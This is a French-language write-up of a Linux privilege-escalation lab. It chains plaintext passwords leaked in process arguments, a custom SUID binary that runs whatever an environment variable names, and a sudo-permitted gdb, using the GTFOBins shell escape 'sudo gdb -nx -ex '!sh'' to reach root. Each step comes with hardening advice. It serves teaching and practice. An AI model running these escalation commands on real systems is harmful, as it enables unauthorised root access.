# Write-Up : Advanced Linux Privilege Escalation

## Informations

- **Machine** : linux-privesc
- **Utilisateur initial** : Creed (password: Mescaline)
- **Objectif** : Obtenir les privilèges root et récupérer le flag
- **Chemin d'escalade** : Creed → Dwight → Michael → root

---

## Phase 1 : Creed → Dwight (Horizontal Privesc)

### Reconnaissance

En tant que Creed, on liste les processus en cours :

```bash
ps aux
```

**Découverte** : Un processus expose des credentials en clair dans ses arguments :

```
/usr/bin/checkusers --user=Dwight --password=BattleStarGalacticaBears
```

### Exploitation

```bash
su Dwight
# Password: BattleStarGalacticaBears
```

**Technique** : Credentials exposés dans la liste des processus (mauvaise pratique de sécurité).

### Comprendre la vulnérabilité : Process Enumeration

Sous Linux, la commande `ps aux` affiche tous les processus en cours avec leurs **arguments complets**. Cela inclut tous les paramètres passés en ligne de commande.

**Pourquoi c'est dangereux ?**
- Tout utilisateur du système peut exécuter `ps aux`
- Les arguments sont stockés dans `/proc/[PID]/cmdline` (lisible par tous)
- Si un mot de passe est passé en argument, il est visible par tous

**Bonnes pratiques :**
- Utiliser des fichiers de configuration avec permissions restrictives
- Utiliser des variables d'environnement (moins exposées mais pas parfait)
- Utiliser des mécanismes de secrets (vaults, keyrings)

**Ressources :**
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

---

## Phase 2 : Dwight → Michael (Vertical Privesc via SUID)

### Reconnaissance

Recherche des binaires SUID :

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Découverte** : `/usr/bin/admin_manage` est un binaire SUID appartenant à Michael.

```bash
ls -la /usr/bin/admin_manage
# -rwsr-xr-x 1 Michael Administrators 9304 Aug 28 2024 /usr/bin/admin_manage
```

Analyse du binaire :

```bash
strings /usr/bin/admin_manage
```

Le binaire utilise `getenv` et contient la chaîne "SCRIPT" → il lit une variable d'environnement SCRIPT pour exécuter un programme.

Vérification dans l'historique de Dwight :

```bash
cat ~/.zsh_history
```

On trouve : `SCRIPT=/admin/manage.sh admin_manage`

### Comprendre le SUID

Le **SUID** (Set User ID) est un bit de permission spécial sous Linux. Quand un binaire a le bit SUID activé, il s'exécute avec les privilèges de son **propriétaire**, pas de l'utilisateur qui le lance.

**Comment reconnaître un binaire SUID ?**
```bash
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 ... /usr/bin/passwd
#    ^-- le 's' indique le SUID
```

**Pourquoi c'est dangereux ?**
- Si un binaire SUID exécute des commandes externes contrôlables, on peut exécuter du code avec les privilèges du propriétaire
- Les binaires SUID custom sont souvent mal sécurisés

**Ressources :**
- [Linux SUID Explained](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)
- [HackTricks - SUID Binaries](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid)

### Exploitation

Le binaire exécute le contenu de la variable SCRIPT avec les privilèges de Michael. On utilise GDB comme payload car il permet d'exécuter des commandes shell :

```bash
SCRIPT=/usr/bin/gdb /usr/bin/admin_manage
```

### Comprendre GDB (GNU Debugger)

**GDB** est un débogueur puissant pour analyser des programmes. Il permet :
- Exécuter un programme pas à pas
- Inspecter la mémoire et les variables
- Mettre des breakpoints

**Pourquoi GDB est dangereux en privesc ?**

GDB possède une fonctionnalité `!commande` qui permet d'exécuter des commandes shell :

```
(gdb) !whoami      # Exécute whoami dans un shell
(gdb) !sh          # Spawn un shell interactif
```

Si GDB est lancé avec des privilèges élevés (SUID ou sudo), les commandes shell héritent de ces privilèges.

**Ressources :**
- [GDB Documentation](https://www.gnu.org/software/gdb/documentation/)
- [GTFOBins - GDB](https://gtfobins.github.io/gtfobins/gdb/)

### Exploration avec GDB

Dans GDB, on explore le home de Michael :

```
(gdb) !ls -la /home/Michael
(gdb) !cat /home/Michael/reminder.rot13
```

**Découverte** : Le fichier contient `FgebatCnffjbeq`

### Comprendre ROT13

Le nom du fichier `reminder.rot13` indique le type d'encodage utilisé.

**ROT13** (Rotate by 13) est un chiffrement par substitution où chaque lettre est décalée de 13 positions :
- A → N, B → O, C → P, ..., M → Z
- N → A, O → B, ..., Z → M

C'est un chiffrement **symétrique** : appliquer ROT13 deux fois redonne le texte original.

**Exemple :**
```
FgebatCnffjbeq  →  StrongPassword
```

**Décodage en ligne de commande :**
```bash
echo 'FgebatCnffjbeq' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Résultat : StrongPassword
```

**Ressources :**
- [ROT13 - Wikipedia](https://en.wikipedia.org/wiki/ROT13)
- [CyberChef - Outil de décodage en ligne](https://gchq.github.io/CyberChef/)

### Connexion en tant que Michael

```bash
su Michael
# Password: StrongPassword
```

**Technique** : Exploitation d'un binaire SUID qui exécute un programme arbitraire via une variable d'environnement.

---

## Phase 3 : Michael → root (Sudo Abuse)

### Reconnaissance

Vérification des privilèges sudo :

```bash
sudo -l
```

**Découverte** : Michael peut exécuter GDB en tant que root sans mot de passe.

```
User Michael may run the following commands on linux4:
    (root : root) NOPASSWD: /usr/bin/gdb
```

### Comprendre GTFOBins

**GTFOBins** (Get The Fuck Out Binaries) est une liste de binaires Unix qui peuvent être exploités pour :
- Obtenir un shell avec privilèges élevés
- Lire/écrire des fichiers protégés
- Bypasser les restrictions de sécurité

**Comment l'utiliser ?**
1. Identifier un binaire exécutable avec sudo (`sudo -l`)
2. Chercher ce binaire sur [gtfobins.github.io](https://gtfobins.github.io/)
3. Copier la commande d'exploitation

**Ressources :**
- [GTFOBins](https://gtfobins.github.io/) - Site officiel
- [GTFOBins - GDB](https://gtfobins.github.io/gtfobins/gdb/) - Page spécifique à GDB

### Exploitation

Utilisation de la technique GTFOBins pour GDB :

```bash
sudo gdb -nx -ex '!sh' -ex quit
```

**Explication des options :**
- `-nx` : Ne pas charger les fichiers de configuration (.gdbinit)
- `-ex '!sh'` : Exécuter la commande GDB `!sh` (spawn un shell)
- `-ex quit` : Quitter GDB après (le shell reste actif)

On obtient un shell root !

### Flag

```bash
cat /root/flag.txt
# FLAG{REDACTED}
```

**Technique** : GTFOBins - exploitation de sudo mal configuré permettant l'exécution de GDB qui offre un escape vers un shell.

---

## Résumé des techniques

| Étape | Technique | Vulnérabilité |
|-------|-----------|---------------|
| Creed → Dwight | Process Enumeration | Credentials en clair dans les arguments de processus |
| Dwight → Michael | SUID Binary Exploitation | Variable d'environnement contrôlable exécutée avec privilèges élevés |
| Michael → root | GTFOBins (sudo gdb) | Configuration sudo permissive sur un binaire dangereux |

---


## Ressources complémentaires

### Outils de reconnaissance
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Script d'énumération automatique
- [LinEnum](https://github.com/rebootuser/LinEnum) - Autre script d'énumération

### Références
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [GTFOBins](https://gtfobins.github.io/)

### Cheatsheets
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [SUID Exploitation](https://pentestlab.blog/2017/09/25/suid-executables/)
